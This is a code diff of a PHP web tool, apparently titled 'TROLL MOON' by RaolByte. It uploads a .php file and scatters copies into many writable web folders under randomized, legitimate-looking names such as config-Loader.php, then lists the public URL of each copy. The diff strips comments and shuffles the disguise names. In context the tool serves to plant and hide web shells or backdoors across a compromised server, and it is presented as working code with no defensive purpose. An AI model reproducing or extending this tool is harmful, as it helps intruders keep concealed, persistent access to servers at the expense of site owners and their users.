@@ -1,6 +1,4 @@
 <?php
-// scatter_upload_auto.php - Upload a .php file and copy it randomly into many folders with randomized names, auto-detecting Base URL.
-// Quick start: php -S 0.0.0.0:8000 -t .  and open http://localhost:8000/scatter_upload_auto.php
 
 ini_set('display_errors', '1');
 error_reporting(E_ALL);
@@ -71,46 +69,42 @@ function ensureUniqueFilename(string $dir, string $basename): string {
 }
 
 function buildHumanSystemNamePool(int $needed): array {
-    // Generate deterministic, human-like names such as db_system.php, auth_service.php, etc.
     $prefixes = [
-        'db','auth','cache','session','config','core','kernel','service','task','queue','cron','log','audit','backup','sync','mail',
-        'api','user','admin','client','device','network','payment','order','product','catalog','inventory','report','stats','billing',
-        'shipping','geo','image','file','upload','download','import','export','web','http','socket','stream','worker','job','scheduler',
-        'monitor','health','status','security','token','oauth','sso','ldap','crypto','hash','ssl','tls','dns','ip','proxy','cdn','renderer',
-        'pdf','doc','excel','csv','xml','json','yaml','parser','validator','sanitizer','filter','firewall','sandbox','docker','k8s','cluster',
-        'node','replica','shard','index','search','engine','recommend','ml','ai','vision','audio','video','encoder','decoder','transcoder',
-        'thumbnail','optimizer','compressor','notifier','webhook','callback','event','bus','broker','mq','kafka','rabbit','redis','memcache',
-        'mysql','pgsql','sqlite','mongo','elastic','clickhouse','s3','gcs','azure','minio','restore','migrate','seed','init','setup','install',
-        'upgrade','update','patch','hotfix','diagnostic','debug','trace','profile','benchmark','feature','flag','rollout','rollback','toggle',
-        'access','permission','role','policy','rule','quota','limit','throttle','rate','balance','autoscale','replication','discovery','registry',
-        'gateway','ingress','egress','edge','router','balancer','waf','websocket','grpc','rpc','rest','graphql','server','handler','controller',
-        'manager','helper','util','cli','daemon','agent','watcher','observer','collector','crawler','scraper','indexer','aggregator','merger',
-        'splitter','matcher','resolver','normalizer','enricher','analyzer','detector','classifier','segmenter','forecaster','trainer','tester',
-        'evaluator','reporter','printer','mailer','sms','push','notification','inbox','outbox','listener','subscriber','publisher','producer',
-        'consumer','dispatcher'
+        'config','kernel','core','system','service','module','driver','adapter','loader','parser','validator','sanitizer','normalizer','resolver',
+        'manager','controller','handler','processor','pipeline','engine','renderer','encoder','decoder','compressor','extractor','indexer',
+        'search','storage','backup','sync','migrate','setup','init','bootstrap','feature','flag','rollout','rollback','updater','patcher',
+        'hotfix','gateway','router','proxy','balancer','firewall','watchdog','observer','listener','subscriber','publisher','dispatcher',
+        'aggregator','collector','crawler','scanner','notifier','webhook','callback','event','broker','queue','task','worker','job','cron',
+        'log','audit','monitor','status','metrics','health','crypto','hash','ssl','tls','dns','ip','net','http','socket','rest','grpc','rpc',
+        'graph','sql','nosql','redis','kafka','mq','http2','json','xml','yaml','csv','ini','cache','session','auth','oauth','sso','ldap',
+        'i18n','l10n','time','date','image','video','audio','thumbnail','optimizer','profiler','tracer','debugger','tester','evaluator',
+        'reporter','printer','helper','util','client','server','cli','daemon','agent','servicebus','scheduler','registry','discovery','replica',
+        'shard','index','recommend','ai','ml','vision','stream','web','app','ui','ux','theme','template','builder','factory','runner','executor'
     ];
     $suffixes = [
-        'system','service','manager','controller','handler','module','engine','daemon','worker','helper','client','server','core','kernel',
-        'config','adapter','bridge','gateway','router','logger','monitor','scheduler','validator','parser','loader','resolver','registry',
-        'factory','builder','executor','runner','processor','pipeline','queue','cache','storage','backup','sync','scanner','watcher','observer'
+        'System','Service','Manager','Controller','Handler','Module','Engine','Daemon','Worker','Helper','Client','Server','Core','Kernel',
+        'Adapter','Bridge','Gateway','Router','Logger','Monitor','Scheduler','Validator','Parser','Loader','Resolver','Registry','Factory',
+        'Builder','Executor','Runner','Processor','Pipeline','Queue','Cache','Storage','Backup','Sync','Scanner','Watcher','Observer','Driver',
+        'Class','Interface','Mapper','Serializer','Deserializer','Repository','Unit'
     ];
-
     $names = [];
     foreach ($prefixes as $p) {
         foreach ($suffixes as $s) {
-            $names[] = $p . '_' . $s;
-            if (count($names) >= $needed) {
-                return array_map(fn($n) => $n . '.php', $names);
-            }
+            $names[] = $p . '-' . $s . '.php';
         }
     }
-    // If still fewer than needed, append numbered variants deterministically
-    $i = 1;
-    while (count($names) < $needed) {
-        $names[] = 'system_module_' . $i;
-        $i++;
+    if (count($names) < $needed) {
+        $i = 1;
+        while (count($names) < $needed) {
+            $names[] = 'system-' . 'Module' . '-' . $i . '.php';
+            $i++;
+        }
     }
-    return array_map(fn($n) => $n . '.php', $names);
+    shuffle($names);
+    if ($needed < count($names)) {
+        $names = array_slice($names, 0, $needed);
+    }
+    return $names;
 }
 
 function detectBaseUrl(): string {
@@ -118,7 +112,6 @@ function detectBaseUrl(): string {
     $scheme = $httpsOn ? 'https' : 'http';
     $host = $_SERVER['HTTP_HOST'] ?? ($_SERVER['SERVER_NAME'] ?? 'localhost');
 
-    // If HTTP_HOST has port, keep it; else, append non-standard port
     $hasPort = (strpos($host, ':') !== false);
     if (!$hasPort) {
         $port = (int)($_SERVER['SERVER_PORT'] ?? 80);
@@ -137,7 +130,7 @@ function pathToUrl(string $absPath, string $webRoot, string $baseUrl): ?string {
         $rel = ltrim(substr($absNorm, strlen($webRootReal)), '/');
         return rtrim($baseUrl, '/') . '/' . str_replace(' ', '%20', $rel);
     }
-    return null; // Not under web root; cannot build URL
+    return null;
 }
 
 function sanitizePath(string $path): string { return rtrim($path); }
@@ -169,7 +162,7 @@ if ($method === 'POST') {
             throw new RuntimeException('Root directory tidak ditemukan.');
         }
 
-        // Allow only .php
+        
         $origName = $_FILES['upload']['name'] ?? '';
         $ext = strtolower(pathinfo($origName, PATHINFO_EXTENSION));
         if ($ext !== 'php') {
@@ -196,7 +189,7 @@ if ($method === 'POST') {
         $baseUrl = detectBaseUrl();
         $webRoot = $defaults['webRoot'];
 
-        // Prepare a human name pool (>= number of selected dirs)
+        
         $namePool = buildHumanSystemNamePool(count($selected));
         $nameIdx = 0;
 
@@ -205,7 +198,7 @@ if ($method === 'POST') {
                 $skipped[] = ['dir' => $dir, 'reason' => 'Folder tidak writable'];
                 continue;
             }
-            // Use deterministic human-like name, ensure unique within the directory
+            
             $baseName = $namePool[$nameIdx] ?? ('system_module_' . ($nameIdx + 1) . '.php');
             $nameIdx++;
             $fileName = ensureUniqueFilename($dir, $baseName);
@@ -241,15 +234,15 @@ if ($method === 'POST') {
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Scatter PHP Uploader · by RaolByte</title>
+  <title>TROLL MOON · by RaolByte</title>
   <style>
     :root {
-      --bg: #0b0f1a; /* deep blue-black */
+      --bg: #0b0f1a;
       --card: #0f1629;
       --muted: #8aa0b5;
       --text: #e8eef5;
-      --accent: #6ea8fe; /* RaolByte blue */
-      --accent-2: #22d3ee; /* cyan */
+      --accent: #6ea8fe;
+      --accent-2: #22d3ee;
       --border: #1f2a44;
       --success: #22c55e;
       --danger: #ef4444;
@@ -297,18 +290,18 @@ if ($method === 'POST') {
     @media (max-width: 640px) {
       body { padding: 16px; }
       .btn { width: 100%; }
-      th:nth-child(3), td:nth-child(3) { display: none; } /* hide path column on small screens */
+      th:nth-child(3), td:nth-child(3) { display: none; }
     }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="brand">
-      <h1>Scatter PHP Uploader</h1>
+      <h1>TROLL MOON</h1>
       <div class="badge">by RaolByte</div>
     </div>
     <div class="card">
-    <h2 style="margin-top:0">Upload & Tebar File PHP (Auto Base URL)</h2>
+    <h2 style="margin-top:0">Byte UPLOAD</h2>
     <form method="post" enctype="multipart/form-data">
       <div class="row">
         <label for="upload">File .php</label>
